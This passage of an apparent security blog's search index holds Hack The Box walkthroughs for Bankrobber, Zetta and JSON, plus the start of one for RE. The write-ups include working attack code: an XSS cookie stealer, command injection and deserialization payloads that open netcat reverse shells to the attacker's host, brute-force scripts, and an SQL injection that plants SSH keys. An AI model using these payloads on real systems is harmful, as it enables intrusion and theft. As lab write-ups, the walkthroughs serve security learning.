to. However using su from the redis shell I can log in as Matt.Looking /etc/ssh/sshd_config we can see that Matt is specifically denied SSH access to the box so that’s why I couldn’t SSH in directly:[...]#deny usersDenyUsers MattPrivesc using webminNow that I have a valid user, I can use the Metasploit exploit for Webmin and get root shell."
  },
  
  {
    "title": "Bankrobber - Hack The Box",
    "url": "/posts/htb-writeup-bankrobber/",
    "categories": "hackthebox, infosec",
    "tags": "xss, sqli, ssfr, command injection, brute force, buffer overflow",
    "date": "2020-03-07 00:00:00 +0800",
    





    
    "snippet": "Bankrobber is a web app box with a simple XSS and SQL injection that we have to exploit in order to get the source code of the application and discover a command injection vulnerability in the back...",
    "content": "Bankrobber is a web app box with a simple XSS and SQL injection that we have to exploit in order to get the source code of the application and discover a command injection vulnerability in the backdoor checker page that’s only reachable from localhost. By using the XSS to make a local request to that page, we can get land a shell on the box. To get root, we exploit a buffer in an application to override the name of the binary launched by the program.Summary  The Transfer E-coin form contains an XSS vulnerability in the comment field  We can grab the administrator username and password and then log in to the site  There’s an SQL injection in the “Search users” function which we can use to dump the database and read files from the box  Using the XSS, we can turn it into an SSRF and get access to the “Backdoorchecker” page which is only accessible by the localhost  After getting the Backdoorchecker source code with the SQLi, we find a command injection vulnerability  Using the injection vulnerability, we can pop a shell with netcat and get the first flag  There’s a custom binary running a banking app on port 910 which we bruteforce to get the PIN  Once we have the PIN, we exploit a buffer overflow to execute an arbitrary program and get a shell as rootPortscanroot@kali:~/htb/bankrobber# nmap -T4 -sC -sV -p- 10.10.10.154Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-21 15:01 EDTNmap scan report for bankrobber.htb (10.10.10.154)Host is up (0.052s latency).Not shown: 65531 filtered portsPORT     STATE SERVICE      VERSION80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4|_http-title: E-coin443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4|_http-title: E-coin| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after:  2019-11-08T23:48:47|_ssl-date: TLS randomness does not represent time| tls-alpn:|_  http/1.1445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)3306/tcp open  mysql        MariaDB (unauthorized)Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 1h00m06s, deviation: 0s, median: 1h00m06s|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)| smb-security-mode:|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode:|   2.02:|_    Message signing enabled but not required| smb2-time:|   date: 2019-09-21T20:03:12|_  start_date: 2019-09-21T20:00:52Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 144.62 secondsSMBSMB is not reachable through null or guest sessions:root@kali:~/htb/bankrobber# smbmap -u invalid -H 10.10.10.154[+] Finding open SMB ports....[!] Authentication error occured[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)[!] Authentication error on 10.10.10.154root@kali:~/htb/bankrobber# smbmap -u '' -H 10.10.10.154[+] Finding open SMB ports....[!] Authentication error occured[!] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)[!] Authentication error on 10.10.10.154MySQLMySQL is not accessible remotely:root@kali:~/htb/bankrobber# mysql -h 10.10.10.154 -u root -pEnter password:ERROR 1130 (HY000): Host '10.10.14.19' is not allowed to connect to this MariaDB serverWeb enumerationThe website is a web application that allows users to buy E-coin cryptocurrency.I can create an account by following the Register link.After logging in I have the option of transferring funds to another user and to leave a comment.When I transfer funds, I get a popup message saying the admin will review the transaction. This screams XSS to me because there’s a comment field that the admin will see and if it’s not sanitized correctly I’ll be able to inject javascript code in his browser session.Exploiting the XSSMy XSS payload in the comments field is very simple: &lt;script src=\"http://10.10.14.19/xss.js\"&gt;&lt;/script&gt;This’ll make the admin browser download a javascript file from my machine and execute its code.The xss.js will steal the session cookies from the admin and send them to my webserver.function pwn() {    var img = document.createElement(\"img\");    img.src = \"http://10.10.14.19/xss?=\" + document.cookie;    document.body.appendChild(img);}pwn();After a few minutes I get two connections. The first downloads the javascript payload and the second one is the connection from the script with the admin cookies.The cookies contains the admin’s username and password Base64 encoded:  Username: admin  Password: HopelessromanticExploiting the SQLiOnce logged in as administrator, I see that there’s a list of transactions, a search function for users and a backdoorchecker.The backdoorchecker is only accessible from the localhost because it returns the following message when I try any commands: It's only allowed to access this function from localhost (::1). This is due to the recent hack attempts on our server.The search function contains an obvious SQL injection since I get the following error after sending a single quote: There is a problem with your SQL syntaxThis should be easy to exploit with sqlmap.I’ll save one of the POST request from the search field in a search.req file:POST /admin/search.php HTTP/1.1Host: bankrobber.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://bankrobber.htb/admin/Content-type: application/x-www-form-urlencodedContent-Length: 6Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3DConnection: closeThen I run sqlmap -r search.req to start testing for injection points. As expected it quickly finds the injection point:Exploring with sqlmapFirst I’ll check which user the webapp is running as on the MySQL server: sqlmap -r search.req --current-usercurrent user: 'root@localhost'I’m root so I should be able to get the passwords hashes with: sqlmap -r search.req --passwords[*] pma [1]:    password hash: NULL[*] root [1]:    password hash: *F435725A173757E57BD36B09048B8B610FF4D0C4A quick search online shows the password for this hash is: Welkom1!Nice but that doesn’t really help me for now. Next I’ll get the source code of various PHP files in the web app. This is a Windows box running Apache and PHP so I’m probably looking at a XAMPP stack. A quick search online shows the default base directory for XAMPP is: C:/xampp/htdocsI can use the --file-read flag in sqlmap to read files:sqlmap -r search.req --file-read '/xampp/htdocs/index.php'sqlmap -r search.req --file-read '/xampp/htdocs/admin/search.php'sqlmap -r search.req --file-read '/xampp/htdocs/admin/backdoorchecker.php'The backdoorchecker.php is interesting because it contains an injection vulnerability in the system() function. There’s some filtering done on the provided cmd parameter: it has to start with dir and can’t contain $( or &amp;. But that’s not enough to prevent injecting commands. Source code shown below:&lt;?phpinclude('../link.php');include('auth.php');$username = base64_decode(urldecode($_COOKIE['username']));$password = base64_decode(urldecode($_COOKIE['password']));$bad \t  = array('$(','&amp;');$good \t  = \"ls\";if(strtolower(substr(PHP_OS,0,3)) == \"win\"){    $good = \"dir\";}if($username == \"admin\" &amp;&amp; $password == \"Hopelessromantic\"){    if(isset($_POST['cmd'])){        // FILTER ESCAPE CHARS        foreach($bad as $char){            if(strpos($_POST['cmd'],$char) !== false){                die(\"You're not allowed to do that.\");            }        }        // CHECK IF THE FIRST 2 CHARS ARE LS        if(substr($_POST['cmd'], 0,strlen($good)) != $good){            die(\"It's only allowed to use the $good command\");        }        if($_SERVER['REMOTE_ADDR'] == \"::1\"){            system($_POST['cmd']);        } else{            echo \"It's only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server.\";        }    }} else{    echo \"You are not allowed to use this function!\";}?&gt;Turning the XSS into an SSRFAs I found earlier I can’t reach the backdoorchecker.php file from my own machine but I can use the same XSS to turn it into a SSRF. I’ll need to change my javascript payload to generate a POST request to the backdoor checker page with the right parameters. After some trial an error I found that dir|\\\\\\\\10.10.14.19\\\\test\\\\nc.exe 10.10.14.19 7000 -e cmd.exe\" payload works to execute netcat over SMB and get a shell.function pwn() {    document.cookie = \"id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D\";    var uri =\"/admin/backdoorchecker.php\";    xhr = new XMLHttpRequest();    xhr.open(\"POST\", uri, true);    xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");    xhr.send(\"cmd=dir|\\\\\\\\10.10.14.19\\\\test\\\\nc.exe 10.10.14.19 7000 -e cmd.exe\");}pwn();C:\\xampp\\htdocs\\admin&gt;type c:\\users\\cortin\\desktop\\user.txtf6353466...Privesc using bank transfer applicationThere’s something odd running on port 910…I also see a bankv2.exe file in the system root directory but I can’t read it.I generated an metasploit reverse shell payload, uploaded it then created a port forward for this port:meterpreter &gt; portfwd add -l 910 -p 910 -r 127.0.0.1[*] Local TCP relay created: :910 &lt;-&gt; 127.0.0.1:910I can reach the application now on port 910 but I don’t have a valid PIN:I tried checking for buffer overflows but couldn’t crash the program so I likely have to brute force the PIN first. I made a quick script to brute force the PIN:#!/usr/bin/pythonfrom pwn import *import timeimport sysi = int(sys.argv[1])j = int(sys.argv[2])while True:    m = \"\"    if i &lt; j:        pin = str(i).zfill(4)        p = remote(\"127.0.0.1\", 910)        try:            p.recvuntil(\"[$]\", timeout=30)            p.sendline(\"%s\" % pin)        except EOFError:            print(\"Retry on %d\" % i)            continue        try:            m = p.recvline(timeout=10)            print m        except EOFError:            print(\"Retry on %d\" % i)            continue        if \"Access denied, disconnecting client\" not in m:            print m            exit(0)        print \"Doing ... \" + str(i)        i = i + 1    else:        print(\"We're done.\")        exit(0)    p.close()Thankfully the PIN was a low number so I didn’t have to search the entire PIN space: 0021When I log in with the PIN, I can transfer coins and I see that the transfer.exe command is executed:If I send a large string I can see there’s a buffer overflow present in the program since I no longer see the transfer.exe and it’s replaced by some characters that submitted in the amount field.The offset is 32 bytes as shown below:Note that whatever is overflowing from the amount variable gets into the name of the program that is executed after. So I can simply replace the executed program by a meterpreter payload I uploaded:My meterpreter gets executed and I get a shell as NT AUTHORITY\\SYSTEMmeterpreter &gt; cat /users/admin/desktop/root.txtaa65d8e..."
  },
  
  {
    "title": "Zetta - Hack The Box",
    "url": "/posts/htb-writeup-zetta/",
    "categories": "hackthebox, infosec",
    "tags": "ipv6, rsync, sqli, postgresql",
    "date": "2020-02-22 00:00:00 +0800",
    





    
    "snippet": "Zetta is another amazing box by jkr. The first part was kinda tricky because you had to pay attention to the details on the webpage and spot the references to IPv6 that lead you to the EPTR command...",
    "content": "Zetta is another amazing box by jkr. The first part was kinda tricky because you had to pay attention to the details on the webpage and spot the references to IPv6 that lead you to the EPTR command to disclose the IPv6 address of the server. Then there’s some light bruteforcing of rsync’s credentials with a custom bruteforce script and finally a really cool SQL injection in a syslog PostgreSQL module.Summary  Obtain FTP credentials from the main webpage  Disclose the IPv6 address of the server by using the EPTR command  Find the rsync service available on IPv6 only  Find a hidden module for /etc and recover the rsyncd.conf file  Find another hidden module for home_roy and brute force the password  Drop my SSH public key in roy home directory and get a shell  Find .tudu.xml file containing a few hints  Find the SQL query executed to insert syslog messages in the database and the syslog facility used to test the database  Discover SQL injection in the query and use stacked query to write my SSH public key to PostgreSQL home directory  SSH in as postgres and view the psql history file to find the postgres user password  Find that the root password is based on the postgres password and the hint from the todo file (password scheme)PortscanFirst pass at checking the FTP siteI can’t log in as anonymous on the FTP site:Zetta websiteThe website is a generic company website without any dynamic components. Everything is static on this page and the contact form is not functional since it points to the anchor.In the services section, it mentions that they support native FTP and FXP, as well as RFC2428. RFC2428 describes the standard for FTP Extensions for IPv6 and NATs.Further down on the page there are FTP credentials shown in cleartext:Username: O5Pnd3a9I8rt6h9gL6DUWhv1kwpV2JffPassword: O5Pnd3a9I8rt6h9gL6DUWhv1kwpV2JffDisclosing the server IPv6 addressI can log in to the FTP server with the credentials from the page but I don’t see any files or anything interesting.I remember from the main page that the server supports IPv6 but I don’t have the IPv6 address. I could find the IP by pinging the box from another one on the same LAN calculating the IPv6 based based on the MAC address but instead I will use the EPRT command to force a connection back to my machine over IPv6 and find the source IP.According to https://tools.ietf.org/html/rfc2428:   The following are sample EPRT commands:        EPRT |1|132.235.1.2|6275|        EPRT |2|1080::8:800:200C:417A|5282|I recovered the IPv6 address: dead:beef::250:56ff:feb2:9d22Portscanning IPv6I’ll add the address to my local hostfile and then portscan the IPv6 address:So there’s an rsync service running on port 8730.Rsync enumerationI’ll list the available modules with rsync rsync://zetta.htb:8730:I tried all modules in the list but I get unauthorized access every time:I tried a couple of directories that are not in the list and was able to access /etc/:I’ll just sync all the files to my local machine so I can examine them:The rsyncd.conf file locks down access to the various directories shown in the list and only allows access from 104.24.0.54:[...]# Allow backup server to backup /opt[opt]\tcomment = Backup access to /opt\tpath = /opt\t# Allow access from backup server only.\thosts allow = 104.24.0.54[...]However at the bottom there is a module that I haven’t found before:# Syncable home directory for .dot file sync for me.# NOTE: Need to get this into GitHub repository and use git for sync.[home_roy]\tpath = /home/roy\tread only = no\t# Authenticate user for security reasons.\tuid = roy\tgid = roy\tauth users = roy\tsecrets file = /etc/rsyncd.secrets\t# Hide home module so that no one tries to access it.\tlist = falseUnfortunately I can’t get access to the secrets file /etc/rsyncd.secrets:root@kali:~/htb/zetta/tmp# rsync rsync://zetta.htb:8730/etc/rsyncd.secrets .[]...]rsync: send_files failed to open \"/rsyncd.secrets\" (in etc): Permission denied (13)rsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1677) [generator=3.1.3]I’ll try to bruteforce the password by using a simple bash loop. I use the sshpass program to pass the password to the interactive logon:#!/bin/bashfor p in $(cat /opt/SecLists/Passwords/Leaked-Databases/rockyou-10.txt)do    sshpass -p $p rsync -q rsync://roy@zetta.htb:8730/home_roy    if [[ $? -eq 0 ]]    then        echo \"Found password: $p\"        exit    fidoneAfter a few seconds I’m able to recover the password: computerGetting a shellThe password works and I can access roy’s home directory:The password computer doesn’t work over SSH (since rsync uses a separate authentication database), but I can just upload my SSH keys and then SSH in.PrivescThe home directory contains a data file for the tudu application:  TuDu is a commandline tool to manage hierarchical TODO lists, so that you can organize everything you have to do in a simple and efficient way. It does not use any database backend, but plain XML files.The tudu file contains a couple of hints:  There is a shared password scheme used, this could be useful later when I find more credentials  The syslog events are pushed to a PostgreSQL database  There’s a reference to a git dotfileLooking around the box, I find a few git repos:roy@zetta:~$ find / -type d -name .git 2&gt;/dev/null/etc/pure-ftpd/.git/etc/nginx/.git/etc/rsyslog.d/.gitThe repos for pure-ftpd and nginx are not very interesting, but the rsyslog one has a few hints in the last commit:  There’s a template configured to insert the syslog message into the syslog_lines table  The database credentials are shown below  There’s a comment about using local7.info for testingI tried logging in with the credentials but they didn’t work. I think this is because the file has been edited but not committed to the git repo yet. I can’t read the pgsql.conf file so I don’t have the latest credentials.The log files in /var/log/postgresql contain error logs related to PostgreSQL:Based on the hint in the git commit, I can use local7.info to send syslog messages into the database. I see that I can trigger an error by using a single quote:Even though the template escapes the single quotes to \\', it still presents an SQL injection vector. I can’t just close the single quote and do a stacked query because the insert expects two values. So what I’ll do is insert the right values using $$ as replacement for single quotes, then issue a 2nd command using COPY to deliver my SSH public key in the postgres home directory:logger -p local7.info \"', \\$\\$2019-08-31 23:37:22\\$\\$); copy (select \\$\\$SSH_KEY_CONTENTS\\$\\$) to \\$\\$/var/lib/postgresql/.ssh/authorized_keys\\$\\$ --; \"After looking around for a while I find the postgres password in the psql history file: sup3rs3cur3p4ass:postgres@zetta:~$ cat /var/lib/postgresql/.psql_historyCREATE DATABASE syslog;\\c syslogCREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);\\d syslog_linesALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';There was a hint in the tudu file about a shared password scheme. The password scheme is &lt;secret&gt;@userid so I’ll try sup3rs3cur3p4ass@root and see if I can su to root:"
  },
  
  {
    "title": "JSON - Hack The Box",
    "url": "/posts/htb-writeup-json/",
    "categories": "hackthebox, infosec",
    "tags": "deserialization, unintended, juicy potato, reversing, dnspy",
    "date": "2020-02-15 00:00:00 +0800",
    





    
    "snippet": "To get remote code execution on JSON, I exploited a deserialization vulnerability in the web application using the Json.net formatter. After getting a shell I could either get a quick SYSTEM shell ...",
    "content": "To get remote code execution on JSON, I exploited a deserialization vulnerability in the web application using the Json.net formatter. After getting a shell I could either get a quick SYSTEM shell by abusing SeImpersonatePrivileges with Juicy Potato or reverse the Sync2FTP application to decrypt its configuration and find the superadmin user credentials.Summary  Get access to the dashboard using admin/admin credentials and find the API token endpoint  Create a payload with ysoserial.net to get RCE through deserialization vulnerability in the Bearer header  I can get SYSTEM with Juicy Potato since my low priv user has SeImpersonatePrivilege (unintended way)  I reverse the .NET app Sync2Ftp to find how the credentials stored in the config are encrypted and retrieve the superadmin passwordPortscan# nmap -sC -sV -p- -T4 10.10.10.158Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-29 20:30 EDTNmap scan report for 10.10.10.158Host is up (0.052s latency).Not shown: 65521 closed portsPORT      STATE SERVICE      VERSION21/tcp    open  ftp          FileZilla ftpd| ftp-syst:|_  SYST: UNIX emulated by FileZilla80/tcp    open  http         Microsoft IIS httpd 8.5| http-methods:|_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/8.5|_http-title: Json HTB135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49152/tcp open  msrpc        Microsoft Windows RPC49153/tcp open  msrpc        Microsoft Windows RPC49154/tcp open  msrpc        Microsoft Windows RPC49155/tcp open  msrpc        Microsoft Windows RPC49156/tcp open  msrpc        Microsoft Windows RPC49157/tcp open  msrpc        Microsoft Windows RPC49158/tcp open  msrpc        Microsoft Windows RPCService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsFTPAnonymous access is not enabled and this version doesn’t not appear vulnerable to any public exploit I could find:# ftp 10.10.10.158Connected to 10.10.10.158.220-FileZilla Server 0.9.60 beta220-written by Tim Kosse (tim.kosse@filezilla-project.org)220 Please visit https://filezilla-project.org/Name (10.10.10.158:root): anonymous331 Password required for anonymousPassword:530 Login or password incorrect!Login failed.Remote system type is UNIX.SMBI can’t enumerate the shares on this machine since I don’t have access. I try null and guest sessions without success:root@kali:~/htb/json# smbmap -u invalid -H 10.10.10.158[+] Finding open SMB ports....[!] Authentication error occured[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)[!] Authentication error on 10.10.10.158root@kali:~/htb/json# smbmap -u '' -H 10.10.10.158[+] Finding open SMB ports....[!] Authentication error occured[!] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)[!] Authentication error on 10.10.10.158Web server pageI’m prompted to log in on the main site:I try a few default credentials combinations and find that the admin / admin credentials work and I can log in to the site and access the dashboard:At first glance this seems like a static page with nothing useful on it. The only thing that stands out is the /api/token endpoint used during the login.# gobuster dir -q -w /opt/SecLists/Discovery/Web-Content/big.txt -u http://10.10.10.158/css (Status: 301)/files (Status: 301)/img (Status: 301)/js (Status: 301)/views (Status: 301)I’ll check out /files next, maybe it contains something useful.# gobuster dir -q -t 50 -w /opt/SecLists/Discovery/Web-Content/big.txt -x txt,php -u http://10.10.10.158/files/password.txt (Status: 200)The password file contains something but I’m not sure if it’s a username or a password. This is probably just a troll.# curl 10.10.10.158/files/password.txtJajajaNot CorrectJson.net deserializationThe name of the box is Json so this is a hint about what to look for on this box. The only thing I found that uses JSON is the login form with the /api/token endpoint.By playing with the input in Burp Suite, I can produce a 500 error message when I give it an invalid JSON payload (missing a double quote). The error message discloses the path of one of the web app C# file: C:\\\\Users\\\\admin\\\\source\\\\repos\\\\DemoAppExplanaiton\\\\DemoAppExplanaiton\\\\Controllers\\\\AccountController.cs.Next, I look at the OAuth2 cookie set after I authenticate:Decoded it is: {\"Id\":1,\"UserName\":\"admin\",\"Password\":\"21232f297a57a5a743894a0e4a801fc3\",\"Name\":\"User Admin HTB\",\"Rol\":\"Administrator\"}When the main page accesses the /api/Account endpoint, I see it also sends the same base64 encoded value in the Bearer header:I’ll modify the Bearer header and see if I can make it error out. To start with, I’ll use the following payload which is invalid JSON:echo '{\"Id\":1,\"UserName\":\"admin\",\"Password\":\"21232f297a57a5a743894a0e4a801fc3\",thisisinvalid___aaaaaaa}' | base64 -w0Ahah! So now I know that the web application is deserializing the Bearer content using the Json.Net library. I remember reading about deserialization vulnerabilities recently during my OSWE studies. There was also another HTB box called Arkham who used a deserialization vulnerability but with Java.There’s a nice tool already written that generates deserialization payloads using gadgets found in common librairies and frameworks. For this box, I’ll use the ObjectDataProvider gadget with the Json.net formatter. I’ll attempt to get a reverse shell by executing netcat through an SMB share on my box.ysoserial.exe -g ObjectDataProvider -f json.net -c \"\\\\\\\\10.10.14.21\\\\pwn\\\\nc.exe -e cmd.exe 10.10.14.21 4444\" -o raw{    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',    'MethodName':'Start',    'MethodParameters':{        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',        '$values':['cmd','/c \\\\\\\\10.10.14.21\\\\pwn\\\\nc.exe -e cmd.exe 10.10.14.21 4444']    },    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}}I’ll need to base64 encode the payload so I use the -o base64 flag instead:ysoserial.exe -g ObjectDataProvider -f json.net -c \"\\\\\\\\10.10.14.21\\\\pwn\\\\nc.exe -e cmd.exe 10.10.14.21 4444\" -o base64ew0KICAgI[...]Dg5J30NCn0=When I send the payload in the Bearer I still get a 500 error message…But a few seconds after I get a callback on my SMB server then a shell after:My user is userpool and he has the user.txt flag in his desktop folder:Privesc unintended methodFirst, let’s check which Windows version the machine is running.c:\\windows\\system32\\inetsrv&gt;systeminfo | findstr WindowsOS Name:                   Microsoft Windows Server 2012 R2 DatacenterNext, I see that my user has SeImpersonatePrivilege privileges.c:\\windows\\system32\\inetsrv&gt;whoami /privPRIVILEGES INFORMATION----------------------Privilege Name                Description                               State============================= ========================================= ========SeAssignPrimaryTokenPrivilege Replace a process level token             DisabledSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        DisabledSeAuditPrivilege              Generate security audits                  DisabledSeChangeNotifyPrivilege       Bypass traverse checking                  EnabledSeImpersonatePrivilege        Impersonate a client after authentication EnabledSeIncreaseWorkingSetPrivilege Increase a process working set            DisabledThis is pretty much game over at that point due to the good old Rotten/Juicy Potato exploit that works prior to Windows Server 2019. If we have SeImpersonatePrivilege privileges then we can easily escalate to NT AUTHORITY\\SYSTEM.Privesc using Sync2FtpNow on to the intended way to root this box. There’s an application called Sync2Ftp running on the system which has a configuration file with encrypted credentials:Directory of c:\\Program Files\\Sync2Ftp05/23/2019  03:06 PM    &lt;DIR&gt;          .05/23/2019  03:06 PM    &lt;DIR&gt;          ..05/23/2019  02:48 PM             9,728 SyncLocation.exe05/23/2019  03:08 PM               591 SyncLocation.exe.config               2 File(s)         10,319 bytes               2 Dir(s)  62,217,244,672 bytes free&lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt;&lt;configuration&gt;  &lt;appSettings&gt;    &lt;add key=\"destinationFolder\" value=\"ftp://localhost/\"/&gt;    &lt;add key=\"sourcefolder\" value=\"C:\\inetpub\\wwwroot\\jsonapp\\Files\"/&gt;    &lt;add key=\"user\" value=\"4as8gqENn26uTs9srvQLyg==\"/&gt;    &lt;add key=\"minute\" value=\"30\"/&gt;    &lt;add key=\"password\" value=\"oQ5iORgUrswNRsJKH9VaCw==\"&gt;&lt;/add&gt;    &lt;add key=\"SecurityKey\" value=\"_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%\"/&gt;  &lt;/appSettings&gt;  &lt;startup&gt;    &lt;supportedRuntime version=\"v4.0\" sku=\".NETFramework,Version=v4.7.2\" /&gt;  &lt;/startup&gt;&lt;/configuration&gt;When I try to base64 decode the user and password blobs I only get gibberish so it’s probably encrypted with the SecurityKey somehow. I’ll copy the exe file over then disassemble it to find out how the encryption works.The file is a .Net assembly so I’ll use dnspy to disassemble this. It’ll be much easier then reversing a C application since I can get the C# source code instead of assembly.root@kali:~/htb/json# file SyncLocation.exeSyncLocation.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS WindowsThe copy method takes the parameters from the config file and calls the Crypto.Decrypt method.In the Decrypt method, the highlighted if branch is taken since the useHashing parameter was passed as true from the calling method. The key used by the 3DES decryption routine is derived from the MD5 hash of the provided SecurityKey.I have all the pieces I need to decrypt the credentials: I got the ciphertext, the encryption cipher used, the encryption key and the source code to make my life easier. I’ll create a new .Net project and copy parts of the code I need to decypt the credentials.using System;using System.Configuration;using System.Security.Cryptography;using System.Text;namespace JsonDecrypt{    class Program    {        static void Main(string[] args)        {            Console.WriteLine(Decrypt(\"4as8gqENn26uTs9srvQLyg==\", true));            Console.WriteLine(Decrypt(\"oQ5iORgUrswNRsJKH9VaCw==\", true));        }        public static string Decrypt(string cipherString, bool useHashing)        {            byte[] array = Convert.FromBase64String(cipherString);            string s = \"_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%\";            byte[] key;            if (useHashing)            {                MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();                key = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(s));                md5CryptoServiceProvider.Clear();            }            else            {                key = Encoding.UTF8.GetBytes(s);            }            TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();            tripleDESCryptoServiceProvider.Key = key;            tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;            tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;            ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();            byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);            tripleDESCryptoServiceProvider.Clear();            return Encoding.UTF8.GetString(bytes);        }    }}Got the superadmin username and the funnyhtb password.Tried connecting with WinRM but failed:root@kali:/opt/evil-winrm# ./evil-winrm.rb -u superadmin -p funnyhtb -i 10.10.10.158Info: Starting Evil-WinRM shell v1.6Info: Establishing connection to remote endpointError: Can't establish connection. Check connection paramsError: Exiting with code 1Tried psexec and failed:root@kali:/opt/evil-winrm# psexec superadmin:funnyhtb@10.10.10.158 cmd.exeImpacket v0.9.19 - Copyright 2019 SecureAuth Corporation[*] Requesting shares on 10.10.10.158.....[-] share 'ADMIN$' is not writable.[-] share 'C$' is not writable.WMI exec too…root@kali:/opt/evil-winrm# /usr/share/doc/python-impacket/examples/wmiexec.py json/superadmin:funnyhtb@10.10.10.158 cmd.exeImpacket v0.9.19 - Copyright 2019 SecureAuth Corporation[*] SMBv3.0 dialect used[-] rpc_s_access_deniedFTP lets me in though and I can fetch the flag:root@kali:/opt/evil-winrm# ftp 10.10.10.158Connected to 10.10.10.158.220-FileZilla Server 0.9.60 beta220-written by Tim Kosse (tim.kosse@filezilla-project.org)220 Please visit https://filezilla-project.org/Name (10.10.10.158:root): superadmin331 Password required for superadminPassword:230 Logged onRemote system type is UNIX.ftp&gt; ls200 Port command successful150 Opening data channel for directory listing of \"/\"...ftp&gt; cd Desktop250 CWD successful. \"/Desktop\" is current directory.ftp&gt; ls200 Port command successful150 Opening data channel for directory listing of \"/Desktop\"-r--r--r-- 1 ftp ftp            282 May 22  2019 desktop.ini-r--r--r-- 1 ftp ftp             32 May 22  2019 root.txt226 Successfully transferred \"/Desktop\""
  },
  
  {
    "title": "RE - Hack The Box",
    "url": "/posts/htb-writeup-re/",
    "categories": "hackthebox, infosec",
    "tags": "yara, usosvc, unintended, libreoffice, macros, ods, CVE-2018-20253",
    "date": "2020-02-01 00:00:00 +0800",
    





    
    "snippet": "I had fun solving RE but I did it using an unintended path. After getting a shell with a macroed .ods file, I saw that the Winrar version had a CVE which allowed me to drop a webshell in the webser...",
    "content": "I had fun solving RE but I did it using an unintended path. After getting a shell with a macroed .ods file, I saw that the Winrar version had a CVE which allowed me to drop a webshell in the webserver path and get RCE as iis apppool\\re. The user had access to modify the UsoSvc service running with SYSTEM privileges so it was trivial at that point to get a SYSTEM shell. Because the root flag was encrypted for user Coby, I used meterpreter to impersonate his token and read the file.Summary  Find the blog site and the hints related to malware and yara rules  Craft a malicious .ods file with a macro that downloads and executes netcat when the document is opened  Upload the file through the SMB share and gain a shell as user Luke  Exploit CVE-2018-20253 to write an aspx webshell into one of the webserver directories  Get a shell with the aspx as user iis apppool\\re  Reconfigure the UsoSvc service to spawn another netcat and get a shell as SYSTEM  Upload a meterpreter, impersonate user Coby and read the final flagInitial reconPortscan# nmap -sC -sV -p- 10.10.10.144Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-29 16:06 ESTNmap scan report for re.htb 